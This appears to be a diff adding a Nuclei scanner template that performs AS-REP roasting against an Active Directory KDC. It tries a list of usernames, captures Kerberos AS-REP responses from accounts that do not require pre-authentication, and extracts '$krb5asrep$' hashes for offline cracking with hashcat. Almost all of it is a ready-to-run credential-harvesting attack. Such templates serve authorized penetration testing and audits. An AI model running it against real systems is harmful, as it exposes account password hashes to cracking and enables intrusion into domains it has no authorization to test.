@@ -1,0 +1,57 @@
+id: asrep-roast
+info:
+  name: Active Directory AS-REP Roast (DONT_REQ_PREAUTH)
+  author: nuclei
+  severity: high
+  description: |
+    Requests an AS-REP for a list of candidate usernames against the target
+    KDC. Accounts that have UF_DONT_REQUIRE_PREAUTH set return a Kerberos
+    pre-auth-less response, exposing the encrypted timestamp to offline
+    cracking (`hashcat -m 18200`).
+  tags: ad,kerberos,asreproast,impacket,unauth
+
+javascript:
+  - pre-condition: |
+      isPortOpen(Host, Port)
+
+    code: |
+      const krb = require('nuclei/krbroast');
+      try {
+          const hash = krb.ASRepRoast({
+              Username: User,
+              Domain:   Domain,
+              KDCHost:  Host + ":" + Port,
+              Format:   "hashcat",
+          });
+          hash;
+      } catch (e) {
+          // KDC returned KRB_ERR_PREAUTH_REQUIRED -> user has preauth, skip
+          "";
+      }
+
+    args:
+      Host:   "{{Host}}"
+      Port:   "88"
+      Domain: "ACME.LOCAL"
+      User:   "{{usernames}}"
+
+    payloads:
+      usernames:
+        - "svc-roast"
+        - "admin"
+        - "krbtgt"
+
+    stop-at-first-match: false
+
+    matchers:
+      - type: word
+        part: response
+        words:
+          - "$krb5asrep$"
+
+    extractors:
+      - type: regex
+        part: response
+        name: asrep_hash
+        regex:
+          - "\\$krb5asrep\\$[^\\s]+"
